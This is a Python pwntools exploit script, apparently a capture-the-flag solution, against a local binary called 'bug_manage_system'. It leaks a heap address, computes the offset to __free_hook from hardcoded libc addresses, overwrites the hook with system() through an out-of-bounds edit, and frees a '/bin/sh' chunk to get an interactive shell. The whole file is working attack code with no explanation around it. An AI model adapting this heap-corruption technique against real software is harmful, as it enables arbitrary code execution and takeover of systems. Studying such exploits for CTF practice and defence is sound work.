from pwn import *

context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

chunk_offset = 0x4b0

system_addr = 0xf75c4da0
freehook_addr = 0xf773d8b0

# gdb.attach(p)

DEBUG = False

def r(msg):
  response = p.recvuntil(msg)
  if DEBUG:
    log.info(response)
  return response

def s(msg, enter = True):
  msg = msg + "\n" if enter else msg
  p.send(msg)
  if DEBUG:
    log.info("Sent: " + msg)

def select_menu(num):
  r("choice : ")
  s(str(num))

def add_bug(name, size, content):
  select_menu(1)

  r("name? : ")
  s(name, False)

  r("size? : ")
  s(str(size))

  r("content? : ")
  s(content, False)

def view_bug():
  select_menu(2)

def edit_bug(idx, offset, value):
  select_menu(3)

  r("idx? : ")
  s(str(idx))

  r("content")
  s("3")

  r("change? : ")
  s(str(offset))

  r("change? : ")
  s(p32(value), False)

def delete_bug(idx):
  select_menu(4)

  r("bug idx? : ")
  s(str(idx))

while True:
  p = process('./bug_manage_system')

  add_bug("A" * 32, 0x200, "a")
  add_bug("A" * 32, 0x80, "a")
  add_bug("A" * 32, 0x200, "a")

  delete_bug(2)
  delete_bug(1)

  add_bug("B" * 32 , 0x200, "bbbb")

  view_bug()

  r("bbbb")
  heap_leak_str = r("===")[:4]

  heap_leak = u32(heap_leak_str)

  print "[*] heap_leak: 0x%x" % heap_leak

  chunk_addr = heap_leak + chunk_offset

  pos = freehook_addr - chunk_addr

  edit_bug(3, pos, system_addr)

  add_bug("C" * 32, 0x10, "/bin/sh\x00")
  delete_bug(4)

  p.sendline("/bin/ls")
  response = p.recvline()

  if response.find("+--------") == -1:
    p.interactive()
    p.close()
  else:
    p.close()
    continue
